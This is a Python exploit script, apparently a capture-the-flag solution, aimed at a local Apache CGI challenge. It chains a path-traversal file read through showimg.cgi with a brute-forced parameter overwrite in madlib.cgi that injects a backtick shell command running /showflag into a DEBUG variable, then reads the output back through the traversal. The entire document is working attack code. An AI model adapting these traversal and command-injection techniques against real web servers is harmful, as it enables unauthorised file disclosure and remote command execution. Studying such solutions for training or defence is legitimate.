#!/usr/bin/env python3

import requests
import sys
import random
import string

baseurl = "http://localhost:1997"


flagfile = "/tmp/" + \
    "".join([random.choice(string.ascii_letters+string.digits)
            for _ in range(20)])

print(f"Temp file {flagfile}")


def getfile(p, outf=None):
    N = 128 - 1 - len("/usr/local/apache2/data//")
    p = "../../../.."+p
    p = "/"*(N - len(p)) + p + ".gif"
    url = baseurl + "/cgi-bin/showimg.cgi?" + p
    r = requests.get(url, stream=True)
    r.raw.decode_content = True
    data = r.raw.read()
    if outf is not None:
        with open(outf, "wb") as fp:
            fp.write(data)
    return data


def tryit(offset):
    payload = f"DEBUG=`/showflag>{flagfile}`\0"

    out = []
    for i, c in enumerate(payload):
        d = i + offset
        out += [f"fix{d}={ord(c)}"]

    url = baseurl + "/cgi-bin/madlib.cgi?" + "&".join(out)
    r = requests.get(url)
    if "<!--" in r.text:
        data = getfile(flagfile)
        assert data != b'ERROR: file does not exist\n'
        print(data.decode())
        sys.exit(0)


data = getfile("/usr/local/apache2/cgi-bin/showimg.cgi")
assert data != b'ERROR: file does not exist\n'

for i in range(1000, 4000):
    tryit(i)
